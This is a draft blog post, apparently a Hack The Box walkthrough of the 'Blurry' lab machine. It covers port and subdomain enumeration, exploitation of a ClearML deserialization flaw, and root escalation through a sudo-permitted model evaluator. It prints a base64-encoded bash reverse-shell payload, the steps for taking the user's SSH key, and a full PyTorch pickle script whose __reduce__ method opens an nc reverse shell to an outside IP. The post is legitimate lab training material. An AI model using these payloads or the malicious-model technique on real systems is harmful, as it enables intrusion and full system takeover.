---
draft: true
title: 
date: 2024-08-13
author: William
category: 
tags: 
cover:
  image: test
  alt: test
---

Lets give this bad boy a go on a lovely Saturday afternoon

What can nmap tell us about this target

```bash
└─$ nmap -A -p- 10.10.11.19 -oN nmap.scan
# Nmap 7.94SVN scan initiated Sat Aug 10 11:14:11 2024 as: nmap -A -p- -oN nmap.scan 10.10.11.19
Nmap scan report for 10.10.11.19
Host is up (0.046s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to <http://app.blurry.htb/>
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
# Nmap done at Sat Aug 10 11:14:36 2024 -- 1 IP address (1 host up) scanned in 25.45 seconds

```

Lets add `app.blurry.htb` to our hosts file and run some subdomain enumeration tool to see what else is out there


```bash
└──╼ [★]$ ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://10.10.11.19 -H "HOST: FUZZ.blurry.htb" -ac -o ffuf.scan

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       
_______________________________________________

...
app                     [Status: 200, Size: 13327, Words: 382, Lines: 29, Duration: 11ms]
files                   [Status: 200, Size: 2, Words: 1, Lines: 1, Duration: 21ms]
chat                    [Status: 200, Size: 218733, Words: 12692, Lines: 449, Duration: 56ms]
```


So we have app , files , chat subdomains. Adding these to the hosts file lets enumerate each of these for their sub directories



The `app` subdomain is running a app called clear..ml and with some trusty googling we find this vuln [https://github.com/xffsec/CVE-2024-24590-ClearML-RCE-Exploit](https://github.com/xffsec/CVE-2024-24590-ClearML-RCE-Exploit)

[https://github.com/diegogarciayala/CVE-2024-24590-ClearML-RCE-CMD-POC/tree/main](https://github.com/diegogarciayala/CVE-2024-24590-ClearML-RCE-CMD-POC/tree/main)



![keys](https://i.imgur.com/457thdA.png#center)




In configuring thios we get failed to reolve `api` add hto hosts Add all subdomains to hosts file






```bash
└──$ python3 exploit.py                                                    
                                           
    ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄                                                     
    ⠄⠄⠄⠄⠄⠄⠄⠄⣠⣴⣶⣾⣿⣿⣿⣷⣶⣤⣀⠄⠄⠄⠄⠄⠄⠄                                                     
    ⠄⠄⠄⠄⠄⢀⣴⣿⣿⣿⡿⠿⠟⠛⠻⠿⣿⣿⣿⡷⠆⠄⠄⠄⠄⠄                                                     
    ⠄⠄⠄⠄⢠⣿⣿⣿⠟⠁⠄⠄⠄⠄⠄⠄⠄⠉⠛⠁⠄⠄⠄⠄⠄⠄                                                     
    ⠄⠄⠄⢠⣿⣿⣿⠃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄                                                     
    ⠄⠄⠄⢸⣿⣿⡇⠄⠄⠄⠄⣠⣾⠿⢿⡶⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄                                                     
    ⠄⢸⣿⣿⣿⣿⡇⠄⠄⠄⠄⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄                                                     
    ⠄⠄⣿⣿⣿⣿⣷⡀⠄⠄⠄⠙⠿⣶⡾⠟⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄                                                     
    ⠄⠄⠘⣿⣿⣿⣿⣷⣄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣀⠄⠄⠄⠄⠄⠄⠄                                                     
    ⠄⠄⠄⠘⢿⣿⣿⣿⣿⣷⣦⣤⣀⣀⣠⣤⣴⣿⣿⣷⠄⠄⠄⠄⠄⠄                                                     
    ⠄⠄⠄⠄⠄⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠁⠄⠄⠄⠄⠄⠄⠄                                                     
    ⠄⠄⠄⠄⠄⠄⠄⠈⠛⠻⠿⣿⣿⡏⠉⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄                                                     
    ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄                                                      
CVE-2024-24590 - ClearML RCE
============================
[1] Initialize ClearML
[2] Run exploit
[0] Exit
[>] Choose an option: 1
[+] Creating a copy of clearml.conf in clearml.conf.bak
[+] Initializing ClearML
[i] Press enter after pasting the configuration
...
Web App: http://app.blurry.htb
API: http://api.blurry.htb
File Store: http://files.blurry.htb
...
ClearML setup completed successfully.

```

The script politoly offers to execute the exploit but fails due to it needing pwncat

self report i know but after installing it


```bash
└─$ python3 exploit.py
...
============================
[1] Initialize ClearML
[2] Run exploit
[0] Exit
[>] Choose an option: 2
[+] Your IP: 10.10.14.62
[+] Your Port: 1234
[+] Target Project name Case Sensitive!: Black Swan
[+] Payload to be used: echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42Mi8xMjM0IDA+JjEi | base64 -d | sh
[?] Do you want to start a listener on 1234? (y/n): y
[+] pwncat listener started on 1234
[i] This exploit requires that another user deserializes the payload on their machine.
ClearML Task: created new task id=3df2aa3a66144bbbbdba441a8689b4ed
ClearML results page: http://app.blurry.htb/projects/116c40b9b53743689239b6b460efd7be/experiments/3df2aa3a66144bbbbdba441a8689b4ed/output/log
[i] Please wait...
ClearML Monitor: GPU monitoring failed getting GPU reading, switching off GPU monitoring
bash: cannot set terminal process group (220630): Inappropriate ioctl for device
bash: no job control in this shell
jippity@blurry:~$ 

```


followed up with a

```bash
jippity@blurry:~$ cat user.txt
================ USER_FLAG ================
```


Now to get some persistence and escalate to root

```bash
jippity@blurry:~$ cat /.ssh/id_rsa
=========== PRIVATE_KEY ===========
_________________________________________
└─$ ssh -i id_rsa jippity@10.10.11.19

jippity@blurry:~$ 

```

Persistance achived. Now lets transfure over linpeas and see how we can esculate

```bash
└─$ scp -i /home/kali/.ssh/id_rsa ./linpeas.sh jippity@10.10.11.19:~/
```

Looking through linpeas findings one thing of interest is the program /usr/bin/evaluate_model which is run as root with no password. Upon evaluating the script it take a .pth file. A .pth file is a compiled model file so if we can create our own malicious model then we can escalate.

```bash
jippity@blurry:~$ linpeas.sh
...
User jippity may run the following commands on blurry:
    (root) NOPASSWD: /usr/bin/evaluate_model /models/*.pth
...

```

We can use this script that a summoned from the depths of the internet. As an aside Pytouch is a big library

```python
import torch
import torch.nn as nn
import os

class MaliciousModel(nn.Module):
    # PyTorch's base class for all neural network modules
    def __init__(self):
        super(MaliciousModel, self).__init__()
        self.dense = nn.Linear(10, 1)
    
    # Define how the data flows through the model
    def forward(self, abdulrahman): # Passes input through the linear layer.
        return self.dense(abdulrahman)
   
    # Overridden __reduce__ Method
    def __reduce__(self):
        cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.46 6060 >/tmp/f"
        return os.system, (cmd,)

# Create an instance of the model
malicious_model = MaliciousModel()

# Save the model using torch.save
torch.save(malicious_model, 'callhome.pth')
```

**Explanation of the Script**:

- **`MaliciousModel` Class**: Defines a simple neural network model.
- **`__reduce__ Method`**: Overridden to include a command that creates a reverse shell using netcat.
- **`torch.save` Function**: Saves the model to a file named `.callhome.pth`.

Pushing this onto the box and we execute as follows

```bash

jippity@blurry:~$ sudo /usr/bin/evaluate_model /models/callhome.pth 

# ==================
Looking to our nc awaiting in the wings we get a call home with a root reverse shell

# whoami
root
# cat /root/root.txt
================= ROOT_FLAG =================

```

We arent challenged for a password due to the config of sudo doesnt require a password for that spesific program call. So the fact that we dont know any user passwords doesnt matter

[https://www.hackthebox.com/achievement/machine/1695260/605](https://www.hackthebox.com/achievement/machine/1695260/605)